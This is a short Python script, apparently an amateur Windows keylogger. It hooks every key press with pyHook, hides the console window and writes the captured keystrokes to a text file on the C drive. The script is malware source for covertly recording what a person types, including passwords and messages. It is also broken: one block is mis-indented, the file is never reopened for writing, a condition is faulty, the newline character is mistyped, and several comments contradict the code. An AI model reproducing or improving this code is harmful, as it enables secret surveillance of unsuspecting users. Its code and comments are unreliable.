#walk to the library obtain the books to create Python application

import win32api
import win32console
import win32gui
import pythoncom, pyHook #<-- is the class library for the keyboard

#show the console window to the screen
win = win32console.GetConsoleWindow() #<--
win32gui.ShowWindow(win, 0) #<-- show window popup on screen 

def OnKeyboardEvent (event): #<-- create function for keyboard

    if event.Ascii == 5: #<-- if key pressed is between 5
        exit(1)

    if event.Ascii !=0 or 8: 
        f = open ('c:\output.txt', 'r+') #<-- open the path file as a text file and input the keyboard text

        buffer = f.read()

        f.close() #<--closing the file on the operating system when the user stops typing 

    #reopen the text file when user starts typing again on the keyboard
        f = ('c:\output.txt', 'w')
        
        keylogs = chr(event.Ascii) #<-- chr is characters 

        if event.Ascii == 13:
        
        keylogs = '/n' #<-- start a new line in the text file 
    
        buffer += keylogs 

        f.write(buffer) 
        f.close()
    
#create a hook for the manager object 
hm = pyHook.HookManager() #<-- referencing the class library that was implemented
hm.KeyDown = OnKeyboardEvent #<-- Every time you press on the keyboard, run the function of logging the events in a text file

#set the hook
hm.HookKeyboard()

#wait for forever
pythoncom.PumpMessages()

